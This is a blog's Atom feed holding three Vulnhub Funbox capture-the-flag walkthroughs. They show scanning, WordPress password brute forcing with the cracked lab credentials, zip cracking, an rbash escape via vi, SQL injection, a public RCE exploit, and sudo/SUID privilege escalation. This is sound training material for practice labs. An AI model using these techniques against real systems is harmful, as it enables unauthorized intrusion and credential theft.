@@ -1,0 +1,1460 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-05-05T22:47:06+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Raju Talukder</title><subtitle>Just another boring Cyber Security Researcher | Red Teamer</subtitle><author><name>Raju Talukder</name></author><entry><title type="html">Vulnhub Funbox 2 Walkthrough</title><link href="http://localhost:4000/funbox-series/vulnhub-fun-box-2-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Funbox 2 Walkthrough" /><published>2023-11-17T00:00:00+05:30</published><updated>2023-11-17T00:00:00+05:30</updated><id>http://localhost:4000/funbox-series/vulnhub-fun-box-2-walkthrough</id><content type="html" xml:base="http://localhost:4000/funbox-series/vulnhub-fun-box-2-walkthrough/"><![CDATA[<p>This box is very straightforward; there is nothing complex that we need to know about some tools. From the FTP, we obtained numerous zip files encrypted with passwords. We decrypted one user’s files password and found ‘id_rsa’ inside the zip, allowing SSH login into the box. To escalate privileges, we need to find out the users’ passwords, which are stored inside a history file.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/service_scan <span class="nv">$IP</span>
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5e
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 anna.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 bud.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 homer.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 john.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 marge.zip
+| <span class="nt">-rw-rw-r--</span>   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
+| <span class="nt">-r--r--r--</span>   1 ftp      ftp          1477 Jul 25  2020 tom.zip
+| <span class="nt">-rw-r--r--</span>   1 ftp      ftp           170 Jan 10  2018 welcome.msg
+|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-robots.txt: 1 disallowed entry 
+|_/logs/
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>From the Nmap output, we found three open ports. The first one is FTP, where anonymous login is allowed, and Nmap lists numerous zip files. The second and third ports are SSH and HTTP, respectively. The HTTP port displays a default Apache installation page. Let’s start enumerating one by one.</p>
+
+<h2 id="manual-inspection"><strong>Manual Inspection</strong></h2>
+
+<p>We already observed the anonymous login for FTP, and there are numerous files present. However, before we deep dive into that, I would like to run some backend reconnaissance. So, I will start from port 80 now.</p>
+
+<h3 id="port-80">Port 80</h3>
+
+<p><img src="/assets/images/funbox-2/1.png" alt="" /></p>
+
+<p>This is just the default Apache2 installation page; I did not find anything here. I would like to run fuzzing to find out if there are any interesting files or directories present.</p>
+
+<h3 id="fuzzing-directories">Fuzzing Directories</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt <span class="nt">--hc</span> 404 <span class="s2">"</span><span class="nv">$URL</span><span class="s2">"</span>
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                      
+<span class="o">=====================================================================</span>
+000004227:   403        9 L      28 W       275 Ch      <span class="s2">"server-status"</span>                                                                              
+000004255:   200        375 L    964 W      10918 Ch    <span class="s2">"http://10.10.10.8/"</span> 
+</code></pre></div></div>
+
+<h3 id="fuzzing-files">Fuzzing Files</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt <span class="nt">--hc</span> 404 <span class="s2">"</span><span class="nv">$URL</span><span class="s2">"</span>
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                                                      
+<span class="o">=====================================================================</span>
+000000069:   200        375 L    964 W      10918 Ch    <span class="s2">"index.html"</span>                                                                                 
+000000157:   403        9 L      28 W       275 Ch      <span class="s2">".htaccess"</span>                                                                                  
+000000248:   200        1 L      2 W        17 Ch       <span class="s2">"robots.txt"</span>                                                                                 
+000000379:   200        375 L    964 W      10918 Ch    <span class="s2">"."</span>                                                                                          
+000000537:   403        9 L      28 W       275 Ch      <span class="s2">".html"</span>                                                                                      
+000000806:   403        9 L      28 W       275 Ch      <span class="s2">".php"</span>                                                                                       
+000001564:   403        9 L      28 W       275 Ch      <span class="s2">".htpasswd"</span>                                                                                  
+000001830:   403        9 L      28 W       275 Ch      <span class="s2">".htm"</span>                                                                                                  
+</code></pre></div></div>
+
+<p>I didn’t find anything interesting; it seems they have only installed the Apache2 service, and no application is hosted there.</p>
+
+<h3 id="port-21">Port 21</h3>
+
+<p><img src="/assets/images/funbox-2/2.png" alt="" /></p>
+
+<p>I have successfully logged in as an anonymous user through FTP, and there are many files present here.</p>
+
+<p><img src="/assets/images/funbox-2/3.png" alt="" /></p>
+
+<p><img src="/assets/images/funbox-2/4.png" alt="" /></p>
+
+<p>I have downloaded all the files to my local machine to analyze them. There were two hidden files, and I just renamed the files to make them visible.</p>
+
+<p><img src="/assets/images/funbox-2/5.png" alt="" /></p>
+
+<p>The ‘users’ file and ‘admin’ file had the same content. However, the content of the ‘admin’ file was base64 encrypted, while the ‘users’ file’s content was in plain text format. Inside the content, they provided an idea about the zipped file data, and the password for the zip file was the old password. Currently, we don’t have any information about this password.</p>
+
+<p>I used the Zip2John tool to create a file compatible with John the Ripper and started brute-forcing using the rockyou.txt file. Within a moment, I obtained the password for the ‘tom.zip’ file.</p>
+
+<p><img src="/assets/images/funbox-2/6.png" alt="" /></p>
+
+<p>Using the password, I successfully decrypted the file, and it’s an ‘id_rsa’ file. Now, with the ‘id_rsa’ file in hand and the SSH port open, we can utilize the SSH port to gain a real shell on this box.</p>
+
+<p><img src="/assets/images/funbox-2/7.png" alt="" /></p>
+
+<h1 id="initial-foothold">Initial Foothold</h1>
+
+<p><img src="/assets/images/funbox-2/8.png" alt="" /></p>
+
+<p>As I obtained the ‘id_rsa’ file, I used this private key instead of the user’s password. So, I passed the file and successfully logged into the machine.</p>
+
+<h1 id="post-enumeration--privilege-escalation">Post Enumeration &amp; Privilege Escalation</h1>
+
+<p><img src="/assets/images/funbox-2/9.png" alt="" /></p>
+
+<p>I performed the ‘ls -la’ command to check the content present in the current directory. Here, I found a MySQL history file and a ‘sudo_as_admin_successful’ file. The ‘sudo_as_admin_successful’ file is an indication of the user’s sudo permission existence. Maybe it doesn’t have full sudo permissions, but at least it has the minimal amount. I performed ‘sudo -l’ to find out the permissions, but it asked for the password of this user. To find another way to get root or the ‘tom’ user’s password, I tried to open the ‘mysql_history’ file and encountered an error related to ‘rbash’.</p>
+
+<p><img src="/assets/images/funbox-2/10.png" alt="" /></p>
+
+<p>Rbash is a restricted bash environment where the user only gets some limited permissions. However, rbash is not very reliable because there are lots of techniques and tricks already available to escape rbash. In this scenario, I would like to go for the vi editor escaping technique.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi
+:set <span class="nv">shell</span><span class="o">=</span>/bin/bash
+:shell
+</code></pre></div></div>
+
+<p>It works every time. Now we can see the mysql_history file.</p>
+
+<p><img src="/assets/images/funbox-2/11.png" alt="" /></p>
+
+<p>inside the file i found a insert command where tom and a strings is visible so i just tried the strings a the password and it worked.</p>
+
+<p><img src="/assets/images/funbox-2/12.png" alt="" /></p>
+
+<p>We can see that the ‘tom’ user has full sudo permission on this box, and now that we have the user’s password, we can simply switch the user to root, and we are now root.</p>
+
+<p><img src="/assets/images/funbox-2/13.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="Funbox-Series" /><summary type="html"><![CDATA[This box is very straightforward; there is nothing complex that we need to know about some tools. From the FTP, we obtained numerous zip files encrypted with passwords. We decrypted one user’s files password and found ‘id_rsa’ inside the zip, allowing SSH login into the box. To escalate privileges, we need to find out the users’ passwords, which are stored inside a history file.]]></summary></entry><entry><title type="html">Vulnhub Funbox 3 Walkthrough</title><link href="http://localhost:4000/funbox-series/vulnhub-Fun-Box-3-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Funbox 3 Walkthrough" /><published>2023-11-17T00:00:00+05:30</published><updated>2023-11-17T00:00:00+05:30</updated><id>http://localhost:4000/funbox-series/vulnhub-Fun-Box-3-walkthrough</id><content type="html" xml:base="http://localhost:4000/funbox-series/vulnhub-Fun-Box-3-walkthrough/"><![CDATA[<p>This box was quite interesting to me. I found lots of rabbit holes here. Initially, we discovered three applications. The admin application was vulnerable to SQL injection (SQLi), and we successfully bypassed the authentication, but I could not find any way to access the box from there. In the gym application, I did not find anything exploitable. However, the store application was also vulnerable to SQLi, and we successfully dumped the admin credentials and logged into the application.</p>
+
+<p>The file upload vulnerability was not working for me, so I searched for publicly available exploits and found a Remote Code Execution (RCE) vulnerability. Using the RCE, I obtained credentials for SSH, which led to the initial foothold. Privilege escalation was very straightforward, involving the misuse of permissions. However, we can also obtain root access using the SUID binary.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/service_scan <span class="nv">$IP</span>
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-robots.txt: 1 disallowed entry 
+|_gym
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message<span class="s2">"
+|_    HY000
+</span></code></pre></div></div>
+
+<p>From the Nmap output, we found three open ports. The first one is SSH, and the second and third are web server and MySQL server, respectively. Both service banners confirmed that this is an Ubuntu machine. We can see a message from the web server; it’s a default page, and there is one disallowed entry available. Before we move on, I would like to run a directory brute force on it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.11/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt 
+
+<span class="o">===============================================================</span>
+Gobuster v3.6
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.10.11/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.6
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.11/admin/]
+/store                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.11/store/]
+/secret               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.11/secret/]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276]
+Progress: 23186 / 62285 <span class="o">(</span>37.23%<span class="o">)[</span>ERROR] parse <span class="s2">"http://10.10.10.11/error</span><span class="se">\x</span><span class="s2">1f_log"</span>: net/url: invalid control character <span class="k">in </span>URL
+/gym                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 308] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.11/gym/]
+Progress: 62284 / 62285 <span class="o">(</span>100.00%<span class="o">)</span>
+<span class="o">===============================================================</span>
+Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>From the directory fuzzing, we found three more interesting directories: admin, store, and secret. Let’s manually inspect each directory one by one.</p>
+
+<p><img src="/assets/images/funbox-3/1.png" alt="" /></p>
+
+<p>From the secret i did not found anything interesting. From the admin i found the login page and i tried the basic authentication bypass SQLi payload here.</p>
+
+<p><img src="/assets/images/funbox-3/2.png" alt="" /></p>
+
+<p>The login panel is vulnerable to SQL injection (SQLi), and we successfully bypassed the authentication. However, after spending a good amount of time, I understand that there is no way to obtain a shell, maybe this is a rabbit hole.</p>
+
+<p><img src="/assets/images/funbox-3/3.png" alt="" /></p>
+
+<p>I moved on to the gym application and found nothing interesting here as well. I didn’t want to invest a lot of time here, so I decided to move on to the store application.</p>
+
+<p><img src="/assets/images/funbox-3/4.png" alt="" /></p>
+
+<p>In the store application, I found lots of books present, and the title is ‘CSE Bookstore.’ I also noticed that this application is powered by ProjectWorld. I will look for publicly available exploits.</p>
+
+<p><img src="/assets/images/funbox-3/5.png" alt="" /></p>
+
+<p>First, I clicked on a book image and added a single quote at the end of the URL to generate a SQL syntax error, checking if the application is vulnerable to SQL injection. It did indeed generate the error.</p>
+
+<p><img src="/assets/images/funbox-3/6.png" alt="" /></p>
+
+<p>So, I ran SQLmap and dumped the admin password from the admin table.</p>
+
+<p><img src="/assets/images/funbox-3/7.png" alt="" /></p>
+
+<p>I logged in as an admin, and there is a feature for adding a book where we can upload PHP files as well. Unfortunately, I could not add any books; there was a SQL error for me. So, I searched for publicly available exploits and found this remote code execution exploit on ExploitDB.</p>
+
+<p><img src="/assets/images/funbox-3/8.png" alt="" /></p>
+
+<p>i just search through the terminal and download it to my current folder.</p>
+
+<p><img src="/assets/images/funbox-3/9.png" alt="" /></p>
+
+<h1 id="initial-foothold">Initial foothold</h1>
+
+<p><img src="/assets/images/funbox-3/10.png" alt="" /></p>
+
+<p>By running the payload, I got the Remote Code Execution (RCE). However, this shell is not a reverse shell; it’s just a remote code execution. So, I was poking around with the file system inside the home directory. We found a user, and inside the user’s directory, we found a password file.</p>
+
+<p><img src="/assets/images/funbox-3/11.png" alt="" /></p>
+
+<p>As the SSH port is open and the SSH password is mentioned, we can SSH into the box using these credentials. And now, we are in.</p>
+
+<p><img src="/assets/images/funbox-3/12.png" alt="" /></p>
+
+<h1 id="post-enumeration--privilege-escalation">Post Enumeration &amp; Privilege Escalation</h1>
+
+<p><img src="/assets/images/funbox-3/13.png" alt="" /></p>
+
+<p>First, I checked the sudo permissions and found the ‘time’ binary here, which seems exotic to me. So, I searched in GTFOBins and found two privilege escalation techniques using sudo and the SUID method.</p>
+
+<p><img src="/assets/images/funbox-3/14.png" alt="" /></p>
+
+<p>i just tried the sudo technique and it works.</p>
+
+<p><img src="/assets/images/funbox-3/15.png" alt="" /></p>
+
+<p>When I ran the ‘id’ command, I found that this user is also a member of the ‘lxd’ group. The ‘lxd’ group has a publicly available exploit, but the prerequisite is that we need to run the ‘lxd’ and ‘lxc’ binaries. So, I tried to run them to check if they are present or not, but I received a ‘permission denied’ error.</p>
+
+<p><img src="/assets/images/funbox-3/16.png" alt="" /></p>
+
+<p>I was curious enough, so I tried to find the SUID binaries and found ‘time’ here as well.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/time
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/fusermount
+</code></pre></div></div>
+
+<p>And this technique also worked. The ‘id’ command shows that I am still Tony; however, the effective UID is root, so I can perform every task as root.</p>
+
+<p><img src="/assets/images/funbox-3/17.png" alt="" /></p>]]></content><author><name>raju</name></author><category term="Funbox-Series" /><summary type="html"><![CDATA[This box was quite interesting to me. I found lots of rabbit holes here. Initially, we discovered three applications. The admin application was vulnerable to SQL injection (SQLi), and we successfully bypassed the authentication, but I could not find any way to access the box from there. In the gym application, I did not find anything exploitable. However, the store application was also vulnerable to SQLi, and we successfully dumped the admin credentials and logged into the application.]]></summary></entry><entry><title type="html">Vulnhub Funbox 1 Walkthrough</title><link href="http://localhost:4000/funbox-series/vulnhub-fun-box-1-walkthrough/" rel="alternate" type="text/html" title="Vulnhub Funbox 1 Walkthrough" /><published>2023-11-12T00:00:00+05:30</published><updated>2023-11-12T00:00:00+05:30</updated><id>http://localhost:4000/funbox-series/vulnhub-fun-box-1-walkthrough</id><content type="html" xml:base="http://localhost:4000/funbox-series/vulnhub-fun-box-1-walkthrough/"><![CDATA[<p>I personally found this box quite interesting. To gain the initial foothold, I ran WPScan with a password list, using <code class="language-plaintext highlighter-rouge">rockyou.txt</code> which led to the discovery of two valid user credentials for the web console. One of these users also had SSH access to the box. However, obtaining the shell wasn’t enough; there was an additional step to escape the rbash shell. For root access, post-enumeration was crucial, as there were multiple ways to achieve it. Some methods were relatively straightforward, while others required additional research.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/service_scan <span class="nv">$IP</span>
+
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     ProFTPD
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 d2:f6:53:1b:5a:49:7d:74:8d:44:f5:46:e3:93:29:d3 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 a6:83:6f:1b:9c:da:b4:41:8c:29:f4:ef:33:4b:20:e0 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 a6:5b:80:03:50:19:91:66:b6:c3:98:b8:c4:4f:5c:bd <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Did not follow redirect to http://funbox.fritz.box/
+| http-robots.txt: 1 disallowed entry 
+|_/secret/
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message<span class="s2">"
+|_    HY000
+</span></code></pre></div></div>
+
+<p>From the Nmap results, we found that four ports are publicly accessible: 21 (FTP), 22 (SSH), 80 (HTTP), and 33060 (MySQL). The SSH and HTTP banners confirm that the operating system is Ubuntu. Additionally, the HTTP service redirects to a domain named ‘funbox.fritz.box’. Let’s add this to our hosts file first.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.10.10.5 funbox.fritz.box"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<p>Since we don’t have any valid credentials, we couldn’t access the SSH or MySQL servers. Therefore, I would like to proceed through the web server.</p>
+
+<p><strong>Manual Inspection</strong></p>
+
+<p><img src="/assets/images/fun-box-1/1.png" alt="" /></p>
+
+<p>This is a WordPress application, and I haven’t discovered any interactive elements on the web server, such as input boxes or dynamic pagination, except for the WordPress technology itself. Nmap also revealed a ‘Disallow’ entry in the robots.txt file; let’s check it out.</p>
+
+<p><img src="/assets/images/fun-box-1/2.png" alt="" /></p>
+
+<p>The URL only displays a message: ‘No secrets here. Try harder!’ Since this is a WordPress web application, I plan to run WPScan. However, considering the lack of substantial content during enumeration, generating a word-list based on this application seems unlikely to be fruitful. Instead, I’ll opt to run the rockyou.txt file for password brute-force attacks.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://funbox.fritz.box/ <span class="nt">--enumerate</span> <span class="nt">--passwords</span> /usr/share/wordlists/rockyou.txt
+
+<span class="o">[</span>+] URL: http://funbox.fritz.box/ <span class="o">[</span>10.10.10.5]
+<span class="o">[</span>+] Started: Sat Nov 11 23:33:29 2023
+
+Interesting Finding<span class="o">(</span>s<span class="o">)</span>:
+
+<span class="o">[</span>+] WordPress version 5.4.2 identified <span class="o">(</span>Insecure, released on 2020-06-10<span class="o">)</span><span class="nb">.</span>
+ 
+<span class="o">[</span>+] WordPress theme <span class="k">in </span>use: twentyseventeen
+ 
+<span class="o">[</span>i] No plugins Found.
+
+<span class="o">[</span>i] No Timthumbs Found.
+
+<span class="o">[</span>i] No Config Backups Found.
+
+<span class="o">[</span>i] No DB Exports Found.
+
+<span class="o">[</span>i] No Medias Found.
+
+<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] admin
+ 
+<span class="o">[</span>+] joe
+
+<span class="o">[</span>+] Performing password attack on Wp Login against 2 user/s
+<span class="o">[</span>SUCCESS] - joe / 12345                                                                                                                                        
+<span class="o">[</span>SUCCESS] - admin / iubire                                                                                                                                     
+Trying admin / iubire Time: 00:00:09 &lt;                                                                                 <span class="o">&gt;</span> <span class="o">(</span>670 / 28689453<span class="o">)</span>  0.00%  ETA: ??:??:??
+
+<span class="o">[!]</span> Valid Combinations Found:
+ | Username: joe, Password: 12345
+ | Username: admin, Password: iubire
+</code></pre></div></div>
+
+<p>WPScan revealed two valid user credential combinations. I tested both sets of credentials in the web console, and both were successful. Before proceeding with further enumeration on the web console, I plan to verify these credentials for both FTP and SSH access.</p>
+
+<p><img src="/assets/images/fun-box-1/3.png" alt="" /></p>
+
+<p>During the login attempt for FTP, the credentials for the ‘joe’ user worked successfully. However, the credentials for the ‘admin’ user did not grant access to the FTP service. Using the ‘joe’ user account, we discovered an mbox file and downloaded it to our local machine.</p>
+
+<p><img src="/assets/images/fun-box-1/4.png" alt="" /></p>
+
+<p>The mbox file appears to be a mail file, and within it, we discovered some interesting messages. One message mentioned ‘funny’ as a possible username, and there was also a reference to a backup script, suggesting the existence of a script for backing up certain items. Additionally, there’s a warning message for Joe to change his password, with ‘12345’ being recommended. However, we already know Joe’s password. Let’s attempt to SSH using the credentials for both Joe and Admin.</p>
+
+<p><img src="/assets/images/fun-box-1/5.png" alt="" /></p>
+
+<p><strong>Creds</strong></p>
+
+<aside>
+💡 joe:12345
+admin:iubire
+
+</aside>
+
+<h1 id="initial-foothold">Initial Foothold</h1>
+
+<p>The SSH login attempt with the ‘admin’ user was unsuccessful; however, the credentials for ‘joe’ were valid, providing me with the initial foothold for this box.</p>
+
+<p><img src="/assets/images/fun-box-1/6.png" alt="" /></p>
+
+<h1 id="post-enumeration--privilege-escalation">Post Enumeration &amp; Privilege Escalation</h1>
+
+<p>After gaining the initial foothold, I discovered that the default shell is rbash, the restricted bash shell for Joe. To progress further, we need to find a way to escape this restricted shell.</p>
+
+<p><img src="/assets/images/fun-box-1/7.png" alt="" /></p>
+
+<p>Numerous techniques exist for escaping a jailed shell, but I opted for the vi editor technique. I executed the following commands, successfully escaping the restricted rbash shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi
+:set <span class="nv">shell</span><span class="o">=</span>/bin/bash
+:shell
+</code></pre></div></div>
+
+<p>After successfully escaping the rbash, I searched for the backup script and located a file owned by the ‘funny’ user. Interestingly, the file is readable, writable, and executable for everyone. Although I checked for a cronjob for the ‘joe’ user and found none, since the file is owned by the ‘funny’ user, I assume it is executed by the cron job of the ‘funny’ user.</p>
+
+<p><img src="/assets/images/fun-box-1/8.png" alt="" /></p>
+
+<p>To confirm the existence of the cron job, I transferred pspy to the victim machine and executed it to monitor all input and output operations. After a few moments, I observed a cron job running periodically, executed by both the root and funny users.</p>
+
+<p><img src="/assets/images/fun-box-1/9.png" alt="" /></p>
+
+<p>Since I have write access, I modified the file and added a reverse shell code. I then started a listener on my Kali machine to capture the reverse shell.</p>
+
+<p><img src="/assets/images/fun-box-1/10.png" alt="" /></p>
+
+<p>After few moment i got the reverse shell as user funny.</p>
+
+<p><img src="/assets/images/fun-box-1/11.png" alt="" /></p>
+
